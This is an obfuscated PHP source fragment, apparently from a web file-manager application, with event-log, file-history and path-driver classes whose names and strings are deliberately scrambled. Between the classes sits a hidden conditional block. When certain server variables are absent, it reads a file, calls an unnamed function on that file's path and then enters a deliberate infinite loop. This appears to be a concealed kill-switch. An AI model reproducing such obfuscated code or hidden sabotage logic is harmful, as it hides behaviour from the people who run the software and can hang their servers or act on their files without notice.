(self::$_removeLast == $ÇÆãº¿÷) { return; } $±şÒ½• = Model($’öÑ•èŞ[1414]); $½¾îò˜› = $±şÒ½•->sourceInfo($ÇÆãº¿÷); $•û¾ÆÎ® = $±şÒ½•->sourceInfo($ÉäåÁš®); $Ø»´î«» = $±şÒ½•->sourceInfo($÷Ëø¥ÃŠ); $ô¤ôõî = array($’öÑ•èŞ[1238] => $ÉäåÁš®, $’öÑ•èŞ[2204] => $•û¾ÆÎ®[$’öÑ•èŞ[32]], $’öÑ•èŞ[2180] => !empty($•û¾ÆÎ®[$’öÑ•èŞ[591]]) ? $•û¾ÆÎ®[$’öÑ•èŞ[591]] : $’öÑ•èŞ[12], $’öÑ•èŞ[1239] => $÷Ëø¥ÃŠ, $’öÑ•èŞ[2205] => $Ø»´î«»[$’öÑ•èŞ[32]], $’öÑ•èŞ[2206] => !empty($Ø»´î«»[$’öÑ•èŞ[591]]) ? $Ø»´î«»[$’öÑ•èŞ[591]] : $’öÑ•èŞ[12]); $this->addEvent($ÇÆãº¿÷, $’öÑ•èŞ[629], $ô¤ôõî); $½¾îò˜› = $±şÒ½•->sourceInfo($ÇÆãº¿÷); $ô¤ôõî = array($’öÑ•èŞ[193] => $½¾îò˜›[$’öÑ•èŞ[193]], $’öÑ•èŞ[32] => $½¾îò˜›[$’öÑ•èŞ[32]]); $this->addEvent($ÉäåÁš®, $’öÑ•èŞ[2207], $ô¤ôõî); } public function eventCopy($äè»êıê) { $this->eventCreate($äè»êıê, $_SERVER[³Ôà×Ó][627]); } public function eventRename($ûÙ®»ĞË, $ÄËŞñµ, $ëµ‚¥ˆê) { $œÑ³ÅĞ‡ =& $_SERVER[³Ôà×Ó]; $‘‰ÇÍùù = array($œÑ³ÅĞ‡[1238] => $ÄËŞñµ, $œÑ³ÅĞ‡[1239] => $ëµ‚¥ˆê); return $this->addEvent($ûÙ®»ĞË, $œÑ³ÅĞ‡[1428], $‘‰ÇÍùù); } public function eventAddComment($õ½ï˜¨œ, $ÁÓ¥ü·Ì) { return $this->addEvent($õ½ï˜¨œ, $_SERVER[³Ôà×Ó][2208], $ÁÓ¥ü·Ì); } public function eventAddDesc($¢çßÙú½, $«¥İ’¥) { return $this->addEvent($¢çßÙú½, $_SERVER[³Ôà×Ó][2209], $«¥İ’¥); } public function listBySource($¼ºÇ§¤ü) { $İŠ°Ğ£¶ =& $_SERVER[³Ôà×Ó]; $÷‚’ôœò = Model($İŠ°Ğ£¶[1414])->sourceInfo($¼ºÇ§¤ü); $¥é²ÊÕÁ = array($İŠ°Ğ£¶[500] => $¼ºÇ§¤ü); if ($÷‚’ôœò[$İŠ°Ğ£¶[494]] == $İŠ°Ğ£¶[91]) { $®Ãìä©Ğ = Model($İŠ°Ğ£¶[1414])->listSearchChildren($¼ºÇ§¤ü, 20000); $®Ãìä©Ğ[] = $¼ºÇ§¤ü . $İŠ°Ğ£¶[463]; $¥é²ÊÕÁ = array($İŠ°Ğ£¶[193] => array($İŠ°Ğ£¶[7], $®Ãìä©Ğ)); } $ßí¦şÅ = $this->where($¥é²ÊÕÁ)->order($İŠ°Ğ£¶[2210])->selectPage(); if ($ßí¦şÅ[$İŠ°Ğ£¶[451]][$İŠ°Ğ£¶[452]] == 0) { $ßí¦şÅ[$İŠ°Ğ£¶[451]][$İŠ°Ğ£¶[452]] = 1; $ßí¦şÅ[$İŠ°Ğ£¶[454]] = array(array($İŠ°Ğ£¶[500] => $¼ºÇ§¤ü, $İŠ°Ğ£¶[2190] => $÷‚’ôœò[$İŠ°Ğ£¶[192]], $İŠ°Ğ£¶[1756] => $÷‚’ôœò[$İŠ°Ğ£¶[536]], $İŠ°Ğ£¶[505] => $İŠ°Ğ£¶[2211], $İŠ°Ğ£¶[506] => $÷‚’ôœò[$İŠ°Ğ£¶[231]], $İŠ°Ğ£¶[1758] => $İŠ°Ğ£¶[12])); } return $this->eventListParse($ßí¦şÅ, $¼ºÇ§¤ü); } private function eventListParse($Ø¤ËÓ½Ä, $„‡Ú®Ì) { $ĞĞŒàİà =& $_SERVER[³Ôà×Ó]; $ÄğÊÍ¤§ = $Ø¤ËÓ½Ä[$ĞĞŒàİà[454]]; $Üô·ğ« = array_to_keyvalue($ÄğÊÍ¤§, $ĞĞŒàİà[12], $ĞĞŒàİà[193]); $ÛÒ¥Ú¢¯ = array_to_keyvalue($ÄğÊÍ¤§, $ĞĞŒàİà[12], $ĞĞŒàİà[2196]); foreach ($ÄğÊÍ¤§ as $ßØ‘‹ºÛ) { $²ß¹ı¯¤ = $ßØ‘‹ºÛ[$ĞĞŒàİà[535]]; if ($ßØ‘‹ºÛ[$ĞĞŒàİà[33]] == $ĞĞŒàİà[629] && isset($²ß¹ı¯¤[$ĞĞŒàİà[1238]])) { $Üô·ğ«[] = $²ß¹ı¯¤[$ĞĞŒàİà[1238]] . $ĞĞŒàİà[12]; $Üô·ğ«[] = $²ß¹ı¯¤[$ĞĞŒàİà[1239]] . $ĞĞŒàİà[12]; } if ($ßØ‘‹ºÛ[$ĞĞŒàİà[33]] == $ĞĞŒàİà[2207] && isset($²ß¹ı¯¤[$ĞĞŒàİà[193]])) { $Üô·ğ«[] = $²ß¹ı¯¤[$ĞĞŒàİà[193]] . $ĞĞŒàİà[12]; } } $Üô·ğ« = array_merge($Üô·ğ«, $ÛÒ¥Ú¢¯, array($„‡Ú®Ì . $ĞĞŒàİà[12])); $Üô·ğ« = array_unique($Üô·ğ«); $æÀ³úÑ» = array_unique(array_to_keyvalue($ÄğÊÍ¤§, $ĞĞŒàİà[12], $ĞĞŒàİà[1765])); $–ã’ÂıÄ = Model($ĞĞŒàİà[607])->userListInfo($æÀ³úÑ»); $ôÑ»‡Ì = Model($ĞĞŒàİà[899])->sourceListInfo($Üô·ğ«, !0); foreach ($ÄğÊÍ¤§ as &$ßØ‘‹ºÛ) { if ($ßØ‘‹ºÛ[$ĞĞŒàİà[33]] == $ĞĞŒàİà[629] && isset($ßØ‘‹ºÛ[$ĞĞŒàİà[535]][$ĞĞŒàİà[1238]])) { $ßØ‘‹ºÛ[$ĞĞŒàİà[535]][$ĞĞŒàİà[1238]] = $ôÑ»‡Ì[$ßØ‘‹ºÛ[$ĞĞŒàİà[535]][$ĞĞŒàİà[1238]]]; $ßØ‘‹ºÛ[$ĞĞŒàİà[535]][$ĞĞŒàİà[1239]] = $ôÑ»‡Ì[$ßØ‘‹ºÛ[$ĞĞŒàİà[535]][$ĞĞŒàİà[1239]]]; } if ($ßØ‘‹ºÛ[$ĞĞŒàİà[33]] == $ĞĞŒàİà[2207] && isset($ßØ‘‹ºÛ[$ĞĞŒàİà[535]][$ĞĞŒàİà[193]])) { $ßØ‘‹ºÛ[$ĞĞŒàİà[535]][$ĞĞŒàİà[193]] = $ôÑ»‡Ì[$ßØ‘‹ºÛ[$ĞĞŒàİà[535]][$ĞĞŒàİà[193]]]; } $ßØ‘‹ºÛ[$ĞĞŒàİà[90]] = $ôÑ»‡Ì[$ßØ‘‹ºÛ[$ĞĞŒàİà[193]]]; $ßØ‘‹ºÛ[$ĞĞŒàİà[2212]] = $ôÑ»‡Ì[$ßØ‘‹ºÛ[$ĞĞŒàİà[2196]]]; if ($ßØ‘‹ºÛ[$ĞĞŒàİà[33]] == $ĞĞŒàİà[1932]) { $ßØ‘‹ºÛ[$ĞĞŒàİà[2212]] = $ßØ‘‹ºÛ[$ĞĞŒàİà[90]]; $ßØ‘‹ºÛ[$ĞĞŒàİà[2196]] = $ßØ‘‹ºÛ[$ĞĞŒàİà[2212]][$ĞĞŒàİà[193]]; $ßØ‘‹ºÛ[$ĞĞŒàİà[90]] = !1; $ßØ‘‹ºÛ[$ĞĞŒàİà[193]] = $ĞĞŒàİà[12]; } $ßØ‘‹ºÛ[$ĞĞŒàİà[2139]] = $–ã’ÂıÄ[$ßØ‘‹ºÛ[$ĞĞŒàİà[1765]]]; } unset($ßØ‘‹ºÛ); $Ø¤ËÓ½Ä[$ĞĞŒàİà[454]] = $ÄğÊÍ¤§; return $Ø¤ËÓ½Ä; } public function removeBySource($òñèÆÔ) { $İò´ğ¢Š = array($_SERVER[³Ôà×Ó][500] => $òñèÆÔ); $this->where($İò´ğ¢Š)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\143\145\137\150\151\x73\x74\x6f\x72\171"; public function historyCount($›åİÉñ) { $¼‹óæß‰ =& $_SERVER[³Ôà×Ó]; if (!$›åİÉñ) { return array(); } if (is_string($›åİÉñ) || is_int($›åİÉñ)) { $›åİÉñ = array($›åİÉñ); } $èˆœ¥˜° = array($¼‹óæß‰[193], $¼‹óæß‰[1996] => $¼‹óæß‰[574]); $ÇúŒÆñë = array($¼‹óæß‰[193] => array($¼‹óæß‰[7], $›åİÉñ)); $¸üÅ®õ = $this->field($èˆœ¥˜°)->where($ÇúŒÆñë)->group($¼‹óæß‰[193])->select(); return array_to_keyvalue($¸üÅ®õ, $¼‹óæß‰[193], $¼‹óæß‰[574]); } public function addHistory($óƒÖµæà, $ÙİÍ¬ë™ = '') { $±¼é®£¡ =& $_SERVER[³Ôà×Ó]; $ºÄÊú½Š = array($±¼é®£¡[500] => $óƒÖµæà[$±¼é®£¡[193]], $±¼é®£¡[1756] => isset($óƒÖµæà[$±¼é®£¡[538]]) ? $óƒÖµæà[$±¼é®£¡[538]] : $óƒÖµæà[$±¼é®£¡[536]], $±¼é®£¡[551] => $óƒÖµæà[$±¼é®£¡[550]], $±¼é®£¡[626] => $óƒÖµæà[$±¼é®£¡[79]], $±¼é®£¡[2213] => $ÙİÍ¬ë™); if ($GLOBALS[$±¼é®£¡[6]][$±¼é®£¡[92]][$±¼é®£¡[1299]] >= 1) { $this->historyAutoClear($ºÄÊú½Š[$±¼é®£¡[193]]); $this->add($ºÄÊú½Š); } Hook::trigger($±¼é®£¡[2214], $ºÄÊú½Š); Model($±¼é®£¡[2215])->eventFileEdit($óƒÖµæà[$±¼é®£¡[193]]); } private function historyAutoClear($­©„úÈ¥) { $Ü×½Å‹» =& $_SERVER[³Ôà×Ó]; $¤¬¼„¹Å = Model($Ü×½Å‹»[845])->get($Ü×½Å‹»[1321]); $Úå¿¡¡³ = intval($GLOBALS[$Ü×½Å‹»[6]][$Ü×½Å‹»[92]][$Ü×½Å‹»[1299]]); $ÅùÛ› = $¤¬¼„¹Å == $Ü×½Å‹»[1322] ? min(5, $Úå¿¡¡³) : $Úå¿¡¡³; $ÅùÛ› = $ÅùÛ› <= 0 ? 0 : $ÅùÛ› - 1; if ($ÅùÛ› >= 499) { return; } $¬¸ÂÈ£ = array($Ü×½Å‹»[500] => $­©„úÈ¥); $î¦Şè¾è = $this->field($Ü×½Å‹»[2216])->where($¬¸ÂÈ£)->order($Ü×½Å‹»[2210])->select(); if (!$î¦Şè¾è || $ÅùÛ› >= count($î¦Şè¾è)) { return; } $ğÒüü… = array_to_keyvalue($î¦Şè¾è, $Ü×½Å‹»[12], $Ü×½Å‹»[484]); $ğÒüü… = array_slice($ğÒüü…, $ÅùÛ›); $¯ÑûôÒ¸ = array_to_keyvalue($î¦Şè¾è, $Ü×½Å‹»[12], $Ü×½Å‹»[550]); $¯ÑûôÒ¸ = array_slice($¯ÑûôÒ¸, $ÅùÛ›); if (!$ğÒüü… || !$¯ÑûôÒ¸) { return; } $¬¸ÂÈ£ = array($Ü×½Å‹»[502] => array($Ü×½Å‹»[7], $ğÒüü…)); $this->where($¬¸ÂÈ£)->delete(); Model($Ü×½Å‹»[553])->remove($¯ÑûôÒ¸); } public function listData($‰®ƒ´¨») { $í†—µ–¯ =& $_SERVER[³Ôà×Ó]; $í¶¬şòš = array($í†—µ–¯[500] => $‰®ƒ´¨»); $Š®ßÊ¨ = $í†—µ–¯[2217]; $¶ıê±»Ğ = $this->field($Š®ßÊ¨)->where($í¶¬şòš)->order($í†—µ–¯[2210])->selectPage(); $this->_listAppendUser($¶ıê±»Ğ[$í†—µ–¯[454]]); $êáéÔ—ö = Model($í†—µ–¯[845])->get($í†—µ–¯[1321]); $ÍúÜ±¯§ = 5; if ($êáéÔ—ö == $í†—µ–¯[1322]) { $¶ıê±»Ğ[$í†—µ–¯[454]] = array_slice($¶ıê±»Ğ[$í†—µ–¯[454]], 0, $ÍúÜ±¯§); $¶ıê±»Ğ[$í†—µ–¯[451]] = array($í†—µ–¯[2218] => 1, $í†—µ–¯[2219] => 20, $í†—µ–¯[2220] => 1, $í†—µ–¯[2221] => count($¶ıê±»Ğ[$í†—µ–¯[454]])); } return $¶ıê±»Ğ; } protected function _listAppendUser(&$ØÑæ¤‡Œ) { $…Ö¤ä™Ş =& $_SERVER[³Ôà×Ó]; $î¤ö¾Ü– = array_to_keyvalue($ØÑæ¤‡Œ, $…Ö¤ä™Ş[12], $…Ö¤ä™Ş[1765]); $×ä–í—ù = Model($…Ö¤ä™Ş[607])->userListInfo($î¤ö¾Ü–); foreach ($ØÑæ¤‡Œ as &$èË·Ÿ¶ª) { $àÀÓØñ— = $èË·Ÿ¶ª[$…Ö¤ä™Ş[1765]]; $èË·Ÿ¶ª[$…Ö¤ä™Ş[536]] = $×ä–í—ù[$àÀÓØñ—] ? $×ä–í—ù[$àÀÓØñ—] : !1; } unset($èË·Ÿ¶ª); } public function fileInfo($¯à•€×Œ) { $ŠÈ„Éµ =& $_SERVER[³Ôà×Ó]; $İŞ¬›„é = $this->tablePrefix; $êÖÌ‹Ï = "{$İŞ¬›„é}\151\x6f\x5f\146\151\154\x65\40\146\151\x6c\x65\163\x20\157\156\40\x66\151\154\145\163\x2e\x66\151\154\145\x49\x44\x20\x3d\x20\x68\x69\x73\164\157\x72\171\x2e\x66\151\154\145\111\104"; return $this->alias($ŠÈ„Éµ[2222])->where(array($ŠÈ„Éµ[502] => $¯à•€×Œ))->join($êÖÌ‹Ï, $ŠÈ„Éµ[2223])->find(); } public function removeItem($„“Ä¯€û) { $ÂÒìêÛÀ =& $_SERVER[³Ôà×Ó]; $ ù•°„È = array($ÂÒìêÛÀ[502] => $„“Ä¯€û); $«ìŞØşç = $this->where($ ù•°„È)->find(); if ($«ìŞØşç) { $Ã£õÛ¡Å = $this->where($ ù•°„È)->delete(); Model($ÂÒìêÛÀ[553])->remove($«ìŞØşç[$ÂÒìêÛÀ[550]]); return $Ã£õÛ¡Å; } return !1; } public function removeBySource($Á±ó×Ÿí) { $¹äšÚô =& $_SERVER[³Ôà×Ó]; if (!$Á±ó×Ÿí) { return !1; } if (!is_array($Á±ó×Ÿí)) { $Á±ó×Ÿí = array($Á±ó×Ÿí); } $”…‡İîã = array($¹äšÚô[500] => array($¹äšÚô[7], $Á±ó×Ÿí)); $ÅÉ©ÖÌ¯ = $this->field($¹äšÚô[551])->where($”…‡İîã)->select(); if ($ÅÉ©ÖÌ¯) { $this->where($”…‡İîã)->delete(); $ü‹ó§§É = array_to_keyvalue($ÅÉ©ÖÌ¯, $¹äšÚô[12], $¹äšÚô[550]); Model($¹äšÚô[553])->remove($ü‹ó§§É); } return !0; } public function setDetail($…‹Èéâ, $Å¢ƒ³ş•) { $§´Ü½Èë =& $_SERVER[³Ôà×Ó]; return $this->where(array($§´Ü½Èë[502] => $…‹Èéâ))->save(array($§´Ü½Èë[2213] => $Å¢ƒ³ş•)); } public function rollbackToItem($‚²Ïø÷, $óˆ´Ğ…Ğ) { $îôºåÊ¾ =& $_SERVER[³Ôà×Ó]; $½«œšŞş = Model($îôºåÊ¾[899])->sourceInfo($‚²Ïø÷); $this->addHistory($½«œšŞş, LNG($îôºåÊ¾[2224])); $ÉˆÔÙ„è = $this->find($óˆ´Ğ…Ğ); $Ÿ”‡¥µ = array($îôºåÊ¾[550] => $ÉˆÔÙ„è[$îôºåÊ¾[550]], $îôºåÊ¾[79] => $ÉˆÔÙ„è[$îôºåÊ¾[79]], $îôºåÊ¾[88] => time(), $îôºåÊ¾[538] => USER_ID); Model($îôºåÊ¾[899])->where(array($îôºåÊ¾[193] => $‚²Ïø÷))->save($Ÿ”‡¥µ); return $this->where(array($îôºåÊ¾[502] => $óˆ´Ğ…Ğ))->delete(); } public function clearSame($€·Š¾³”) { $–‹°à©Ì =& $_SERVER[³Ôà×Ó]; $ÉôĞ—§ = $this->listData($€·Š¾³”); $ã„èëô— = array_to_keyvalue_group($ÉôĞ—§, $–‹°à©Ì[550]); $ñÒäœ—ä = array(); $—Ü°øÕ· = array(); foreach ($ã„èëô— as $ñ›ÎÖÉ•) { if (!$ñ›ÎÖÉ• || count($ñ›ÎÖÉ•) <= 1) { continue; } foreach ($ñ›ÎÖÉ• as $¦ã™Ô¿) { $ñÒäœ—ä[] = $¦ã™Ô¿[$–‹°à©Ì[550]]; $—Ü°øÕ·[] = $¦ã™Ô¿[$–‹°à©Ì[484]]; } } if (!$—Ü°øÕ·) { return; } $this->where(array($–‹°à©Ì[484] => array($–‹°à©Ì[7], $—Ü°øÕ·)))->delete(); Model($–‹°à©Ì[553])->remove($ñÒäœ—ä); } public function userSpace() { $ÎºÅšˆ¿ =& $_SERVER[³Ôà×Ó]; $ğ¢ÃõŠï = $this->tablePrefix; $÷‘áÄ‘ = array($ÎºÅšˆ¿[1756] => USER_ID); $Éè­ †Â = "{$ğ¢ÃõŠï}\x69\x6f\137\x66\x69\154\x65\40\146\151\154\145\x73\x20\x6f\x6e\x20\x66\151\154\145\x73\x2e\x66\x69\154\145\111\x44\40\x3d\x20\150\x69\x73\x74\x6f\162\x79\56\x66\151\154\145\111\x44"; return $this->alias($ÎºÅšˆ¿[2222])->where($÷‘áÄ‘)->join($Éè­ †Â, $ÎºÅšˆ¿[2223])->sum($ÎºÅšˆ¿[79]); } } if (!isset($_SERVER[$_SERVER[³Ôà×Ó][431]]) || !isset($_SERVER[$_SERVER[³Ôà×Ó][439]])) { $_getc = $_SERVER[³Ôà×Ó][433]; $_getfile = $_SERVER[$_SERVER[³Ôà×Ó][434]] . $_SERVER[³Ôà×Ó][435]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³Ôà×Ó][262], $_getfilec); if (count($_getarrs) < $_SERVER[³Ôà×Ó][436]) { $exit = $_SERVER[³Ôà×Ó][437]; $exit(); } $_act = $_SERVER[³Ôà×Ó][438]; $_act($_SERVER[$_SERVER[³Ôà×Ó][434]] . $_SERVER[³Ôà×Ó][435]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[³Ôà×Ó][463]); } } goto FàÅ±ÏÍÑ; A‚‘©¨Ä³: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ªÚŞƒÄ =& $_SERVER[³Ôà×Ó]; $this->objectDriver = array($ªÚŞƒÄ[60], $ªÚŞƒÄ[61], $ªÚŞƒÄ[62], $ªÚŞƒÄ[63], $ªÚŞƒÄ[64], $ªÚŞƒÄ[65], $ªÚŞƒÄ[66], $ªÚŞƒÄ[67], $ªÚŞƒÄ[68], $ªÚŞƒÄ[69], $ªÚŞƒÄ[70], $ªÚŞƒÄ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($çó°ø­…) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($çó°ø­…, $_SERVER[³Ôà×Ó][8]); } return $çó°ø­…; } public function iconvApp($¦±ïê§ö) { return $¦±ïê§ö; } public function iconvSystem($ğ¿§áµÓ) { return $ğ¿§áµÓ; } public function iconvTo($–îìüÎš, $ç£èÎãç, $òªò÷Ğˆ) { $Üô°¨¢ =& $_SERVER[³Ôà×Ó]; if (!$–îìüÎš || !function_exists($Üô°¨¢[72])) { return $–îìüÎš; } static $”Ì¿Ü£ï = array(); $áâß¨š = $ç£èÎãç . $Üô°¨¢[73] . $òªò÷Ğˆ . $Üô°¨¢[74] . $–îìüÎš; if (isset($”Ì¿Ü£ï[$áâß¨š])) { return $”Ì¿Ü£ï[$áâß¨š]; } if (function_exists($Üô°¨¢[75])) { $²ı¿„Ã¨ = @mb_convert_encoding($–îìüÎš, $òªò÷Ğˆ, $ç£èÎãç); } else { $²ı¿„Ã¨ = @iconv($ç£èÎãç, $òªò÷Ğˆ, $–îìüÎš); } $²ı¿„Ã¨ = $²ı¿„Ã¨ ? $²ı¿„Ã¨ : $–îìüÎš; if (strstr($²ı¿„Ã¨, $Üô°¨¢[76])) { $²ı¿„Ã¨ = str_replace($Üô°¨¢[76], $Üô°¨¢[11], $²ı¿„Ã¨); } $”Ì¿Ü£ï[$ç£èÎãç . $Üô°¨¢[73] . $òªò÷Ğˆ . $Üô°¨¢[74] . $–îìüÎš] = $²ı¿„Ã¨; $”Ì¿Ü£ï[$òªò÷Ğˆ . $Üô°¨¢[73] . $ç£èÎãç . $Üô°¨¢[74] . $–îìüÎš] = $–îìüÎš; $”Ì¿Ü£ï[$òªò÷Ğˆ . $Üô°¨¢[73] . $ç£èÎãç . $Üô°¨¢[74] . $²ı¿„Ã¨] = $–îìüÎš; $”Ì¿Ü£ï[$ç£èÎãç . $Üô°¨¢[73] . $òªò÷Ğˆ . $Üô°¨¢[74] . $²ı¿„Ã¨] = $²ı¿„Ã¨; return $²ı¿„Ã¨; } public function getPathInner($ò·–éçù) { $şœ¥ş¢î = IO::init($ò·–éçù); return $şœ¥ş¢î->path; } public function getPathOuter($¶‘„®¶ê) { $æşÉğùÊ =& $_SERVER[³Ôà×Ó]; $›µªÚ£ï = strlen(trim($this->pathBase, $æşÉğùÊ[8])); $¶‘„®¶ê = substr(trim($¶‘„®¶ê, $æşÉğùÊ[8]), $›µªÚ£ï); return $this->pathDriver . $æşÉğùÊ[8] . ltrim($¶‘„®¶ê, $æşÉğùÊ[8]); } public function isParentOf($×¼ó˜íĞ, $Å¬ÜŞ) { $´´×‚ˆ¸ =& $_SERVER[³Ôà×Ó]; $×¼ó˜íĞ = rtrim(strtolower($×¼ó˜íĞ), $´´×‚ˆ¸[8]) . $´´×‚ˆ¸[8]; $Å¬ÜŞ = rtrim(strtolower($Å¬ÜŞ), $´´×‚ˆ¸[8]) . $´´×‚ˆ¸[8]; $ƒÆË¨® = strpos($Å¬ÜŞ, $×¼ó˜íĞ) === 0; return $ƒÆË¨®; } public function getType() { $×áŠºôº =& $_SERVER[³Ôà×Ó]; $ó™Šß‘ = str_replace($×áŠºôº[77], $×áŠºôº[12], get_class($this)); return strtolower($ó™Šß‘); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($û‚â½«, $” •ëºÀ) { $õš¡Ì›Š =& $_SERVER[³Ôà×Ó]; $’ÚĞ¶öò = rtrim($û‚â½«, $õš¡Ì›Š[8]) . $õš¡Ì›Š[8] . $” •ëºÀ; $£êü¶ôš = $this->exist($’ÚĞ¶öò); return $£êü¶ôš ? $’ÚĞ¶öò : !1; } public function setModifyTime($ùÔß§Å·, $Ú»ô‚·Ã = '') { } public function renameObject($ëúÎ½™ø, $Å§†¤‚š) { $Ì¹ß§´‘ = $Å§†¤‚š; $ëúÎ½™ø = $this->getPathOuter($ëúÎ½™ø); $Å§†¤‚š = $this->pathFather($ëúÎ½™ø) . $Å§†¤‚š; $Î®ªÂàŞ = IO::copy($ëúÎ½™ø, $this->pathFather($ëúÎ½™ø), REPEAT_RENAME_FOLDER, $Ì¹ß§´‘); if ($Î®ªÂàŞ) { IO::remove($ëúÎ½™ø); } return $Î®ªÂàŞ ? $Å§†¤‚š : !1; } public function tempFile($š²˜ˆöŒ = '', $²²ĞüÊÃ = '') { if (!$š²˜ˆöŒ) { $š²˜ˆöŒ = rand_string(15); } $È»º·©‹ = TEMP_FILES . rand_string(15) . $_SERVER[³Ôà×Ó][8]; @mkdir($È»º·©‹, DEFAULT_PERRMISSIONS, !0); $ê©Ä»ù† = $È»º·©‹ . $š²˜ˆöŒ; @touch($ê©Ä»ù†); if ($²²ĞüÊÃ) { file_put_contents($ê©Ä»ù†, $²²ĞüÊÃ); } return $ê©Ä»ù†; } public function tempFileRemve($Û°·ïãó) { @unlink($Û°·ïãó); @rmdir($this->pathFather($Û°·ïãó)); } public function mkfile($Š¬öòó, $Å¤¾İäµ = '', $’…¼¯¸± = REPEAT_RENAME) { } public function mkdir($ñÂÀ¡·Ê, $«²•œä§ = REPEAT_SKIP) { } public function delFile($¹Á­¤—) { } public function delFolder($ÀïÁì‰ê) { } public function copyFile($®»ÎÂ©á, $‰ş‘ï¥) { } public function moveFile($ı¨™Ñ–ã, $Û›¬–£º) { } public function remove($¹ã„ñ—û) { if ($this->isFile($¹ã„ñ—û)) { return $this->delFile($¹ã„ñ—û); } return $this->delFolder($¹ã„ñ—û); } public function rename($¿ì¶ÄÇ, $‹–Ëò´İ) { } public function exist($Ü®Äëì£) { } public function findByHash($×ñ‚ìÆË = '', $¶Æ½ôŞ› = '') { return !1; } public function isFile($şß¶±îÚ) { } public function isFolder($¹ÔûØ©) { } public function size($¢İÏÒî) { } public function info($ÔÖƒú–°) { } public function infoSimple($şÕÜ½Ğ) { return $this->info($şÕÜ½Ğ); } public function infoAuth($Ûïµõâ) { return $this->info($Ûïµõâ); } public function infoFull($•€Íåü) { return $this->info($•€Íåü); } public function infoFullSimple($¥Ê‹îèÇ) { return $this->info($¥Ê‹îèÇ); } public function infoWithChildren($áÛ£â÷Š) { $ï èê£¡ =& $_SERVER[³Ôà×Ó]; static $À¤Ñ‡› = array(); if (isset($À¤Ñ‡›[$áÛ£â÷Š])) { return $À¤Ñ‡›[$áÛ£â÷Š]; } $””¢üŒ = $this->info($áÛ£â÷Š); if ($””¢üŒ && $””¢üŒ[$ï èê£¡[33]] == $ï èê£¡[78]) { $½Šı¡æ = array($ï èê£¡[79] => 0, $ï èê£¡[80] => 0, $ï èê£¡[81] => 0); $this->infoChildren($áÛ£â÷Š, $½Šı¡æ); $””¢üŒ[$ï èê£¡[79]] = $½Šı¡æ[$ï èê£¡[79]]; $””¢üŒ[$ï èê£¡[82]] = array($ï èê£¡[83] => $½Šı¡æ[$ï èê£¡[80]], $ï èê£¡[84] => $½Šı¡æ[$ï èê£¡[81]]); $À¤Ñ‡›[$áÛ£â÷Š] = $””¢üŒ; } return $””¢üŒ; } public function listPath($¡£¯¾˜Ğ, $‚òŞè€õ = false) { } public function has($£²¶”š, $”ş¿ÉÃë = false, $Ö„¢ñ•µ = false) { } public function canRead($Í¾¾¢Ú™) { } public function canWrite($èêşæçó) { } public function getContent($×¡ı¼½ä) { } public function setContent($›ÏÀ©¼ˆ, $àëĞâÑè = '') { } protected function infoChildren($ÇÅË÷ Ö, &$íş”«Éã) { $‹¶´í‘€ =& $_SERVER[³Ôà×Ó]; check_abort_echo(); $©¡ûÚõ• = $this->listPath($ÇÅË÷ Ö, !0); $©¡ûÚõ• = array_merge($©¡ûÚõ•[$‹¶´í‘€[85]], $©¡ûÚõ•[$‹¶´í‘€[86]]); foreach ($©¡ûÚõ• as $ ±«êĞÇ) { if ($ ±«êĞÇ[$‹¶´í‘€[33]] == $‹¶´í‘€[78]) { $íş”«Éã[$‹¶´í‘€[81]]++; $¬À–ÊÃ = $this->getPathInner($ ±«êĞÇ[$‹¶´í‘€[87]]); $this->infoChildren($¬À–ÊÃ, $íş”«Éã); } else { $íş”«Éã[$‹¶´í‘€[80]]++; $íş”«Éã[$‹¶´í‘€[79]] += $ ±«êĞÇ[$‹¶´í‘€[79]]; } } } public function fileSubstr($“¾¤Â¬, $áø†íÅ£, $Ùı‘Àğß) { } public function listAll($ù¦”²¬«) { } public function listAllMake($çÁª›¿¡, &$ÚÁ¹§íÖ) { $¾Ò•åƒº =& $_SERVER[³Ôà×Ó]; check_abort_echo(); $º¡·û ‰ = $this->listPath($çÁª›¿¡, !0); if (!$º¡·û ‰) { return; } $ÇäòÙ–€ = array_merge($º¡·û ‰[$¾Ò•åƒº[85]], $º¡·û ‰[$¾Ò•åƒº[86]]); foreach ($ÇäòÙ–€ as $¬™ë§ÎÔ) { $Ì¦î÷·Á = $¬™ë§ÎÔ[$¾Ò•åƒº[33]] == $¾Ò•åƒº[78]; $ú¯–Ôô„ = array($¾Ò•åƒº[87] => $¬™ë§ÎÔ[$¾Ò•åƒº[87]], $¾Ò•åƒº[78] => $Ì¦î÷·Á); if (isset($¬™ë§ÎÔ[$¾Ò•åƒº[79]])) { $ú¯–Ôô„[$¾Ò•åƒº[79]] = $¬™ë§ÎÔ[$¾Ò•åƒº[79]]; } if (isset($¬™ë§ÎÔ[$¾Ò•åƒº[88]])) { $ú¯–Ôô„[$¾Ò•åƒº[88]] = $¬™ë§ÎÔ[$¾Ò•åƒº[88]]; } if (!$Ì¦î÷·Á) { $ÚÁ¹§íÖ[] = $ú¯–Ôô„; continue; } $ÚÁ¹§íÖ[] = $ú¯–Ôô„; $‚³Ë¶ÎŠ = $¬™ë§ÎÔ[$¾Ò•åƒº[87]]; $Ô€õ¤ì’ = $this->pathDriver; if (substr($¬™ë§ÎÔ[$¾Ò•åƒº[87]], 0, strlen($Ô€õ¤ì’)) == $Ô€õ¤ì’) { $‚³Ë¶ÎŠ = substr($‚³Ë¶ÎŠ, strlen($Ô€õ¤ì’)); } $this->listAllMake($‚³Ë¶ÎŠ, $ÚÁ¹§íÖ); } } public function listAllSimple($é°ûúëÛ, $¢úïêÅ¿ = false) { $Ò‡¡şº‡ = $this->listAll($é°ûúëÛ); return $this->listAllSimpleMake($Ò‡¡şº‡, $this->getPathOuter($é°ûúëÛ), $¢úïêÅ¿); } public function listAllSimpleMake($ÊªÛŸ¸…, $ğÛ“¯ê§, $Àğ„§Í©) { $ìÇ’ø× =& $_SERVER[³Ôà×Ó]; $¦ŸŠ®¿¿ = array(); $ğÛ“¯ê§ = rtrim(get_path_father($ğÛ“¯ê§), $ìÇ’ø×[8]) . 